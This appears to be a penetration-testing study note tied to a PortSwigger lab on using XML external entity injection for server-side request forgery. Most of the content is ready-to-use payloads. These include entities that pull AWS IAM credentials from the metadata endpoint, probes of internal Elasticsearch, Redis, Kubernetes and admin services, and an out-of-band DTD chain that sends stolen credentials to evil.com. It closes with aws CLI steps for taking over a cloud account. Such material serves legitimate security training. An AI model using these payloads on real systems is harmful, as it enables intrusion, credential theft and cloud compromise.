---
tags: [vapt, xxe, ssrf, intermediate]
difficulty: intermediate
module: "14 - XXE"
topic: "14.08 XXE to SSRF"
portswigger_labs: ["Exploiting XXE to perform SSRF attacks"]
---

# 14.08 — XXE to SSRF

## Using XXE for SSRF

```
XXE SYSTEM URL CAN BE ANY URL — NOT JUST file://!

By using http:// as the SYSTEM URL, the XML parser
makes an HTTP request to that URL → SSRF!

  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

→ Server's XML parser fetches the AWS metadata endpoint!
→ Returns contents → XXE response includes cloud credentials!

XXE → SSRF is particularly powerful because:
  ✓ XXE library bypasses many application-level SSRF filters
  ✓ Works from file upload vectors (DOCX, SVG)
  ✓ Can reach the same internal services as URL-based SSRF
```

---

## Basic XXE SSRF Payload

```xml
<!-- STEP 1: CHECK WHAT METADATA IS AVAILABLE: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root><data>&xxe;</data></root>

<!-- STEP 2: GET ROLE NAME: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
]>
<root><data>&xxe;</data></root>
<!-- Response: EC2InstanceRole -->

<!-- STEP 3: GET CREDENTIALS: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole">
]>
<root><data>&xxe;</data></root>
<!-- Response: {"AccessKeyId": "...", "SecretAccessKey": "...", "Token": "..."} -->
```

---

## Internal Service Access via XXE SSRF

```xml
<!-- INTERNAL ELASTICSEARCH (port 9200): -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:9200/_cat/indices">
]>
<root><data>&xxe;</data></root>
<!-- → Lists all Elasticsearch indices! Dump with subsequent requests -->

<!-- INTERNAL REDIS: -->
<!-- (gopher:// may work in some XML parsers) -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "gopher://127.0.0.1:6379/_PING%0d%0a">
]>
<root><data>&xxe;</data></root>

<!-- KUBERNETES API: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "https://kubernetes.default.svc/version">
]>
<root><data>&xxe;</data></root>

<!-- INTERNAL ADMIN PANEL: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<root><data>&xxe;</data></root>
```

---

## Blind XXE SSRF (OOB Confirmation)

```xml
<!-- CONFIRM SSRF WITHOUT RESPONSE ECHO: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://YOUR_BURP_COLLABORATOR.burpcollaborator.net/ssrf-test">
]>
<root><data>&xxe;</data></root>

<!-- IF COLLABORATOR RECEIVES HTTP REQUEST:
  → XML parser making outbound requests = SSRF confirmed!
  
OOB DATA EXFIL VIA SSRF:
  Point to external DTD that reads data and sends to you:
  <!ENTITY xxe SYSTEM "http://evil.com/steal?data=STOLEN">
  
  But for data from internal URLs → chain with parameter entities:
-->

<!-- EXTERNAL DTD (evil.dtd): -->
<!ENTITY % internal SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://evil.com/steal?creds=%internal;'>">
%eval;
%exfil;

<!-- ATTACK XML: -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % dtd SYSTEM "http://evil.com/evil.dtd">
  %dtd;
]>
<root><data>test</data></root>
<!-- → Fetches evil.dtd → reads AWS metadata → sends to evil.com! -->
```

---

## Port Scanning via XXE SSRF

```bash
# USE XXE AS A PORT SCANNER:
# Check each port via the SSRF — different responses for open vs closed!

for port in 22 80 443 3306 5432 6379 8080 9200 27017; do
  echo "Testing port $port..."
  # Submit XXE payload with url=http://127.0.0.1:PORT/
  # Check response: connection refused = port closed, 200/response = OPEN!
done

# IN BURP INTRUDER:
# Position: http://127.0.0.1:§PORT§/
# Payload: numbers list (1-65535 or common ports list)
# Grep: different response patterns for open/closed ports
```

---

## Chain: XXE → SSRF → AWS Creds → Cloud Takeover

```
FULL EXPLOITATION CHAIN:

1. FIND XXE INJECTION POINT:
   SOAP API, XML upload, SVG upload, DOCX import

2. CONFIRM XXE:
   <!ENTITY xxe SYSTEM "file:///etc/passwd">
   → /etc/passwd in response

3. PIVOT TO SSRF:
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
   → Role name in response: "EC2InstanceRole"

4. STEAL CREDENTIALS:
   <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2InstanceRole">
   → JSON with AccessKeyId, SecretAccessKey, Token

5. USE CREDENTIALS:
   export AWS_ACCESS_KEY_ID="ASIA..."
   export AWS_SECRET_ACCESS_KEY="..."
   export AWS_SESSION_TOKEN="..."
   aws sts get-caller-identity
   aws s3 ls
   aws secretsmanager list-secrets

6. FULL CLOUD ACCOUNT ACCESS!
```

---

## Related Notes
- [[03 - Classic XXE File Read]] — basic XXE
- [[06 - Blind XXE OOB]] — OOB exfiltration
- [[Module 13 - SSRF]] — SSRF module (all SSRF techniques)
- [[Module 13 - SSRF — Cloud Metadata]] — what to access via SSRF
- [[Module 13 - SSRF — RCE via Internal Services]] — escalation
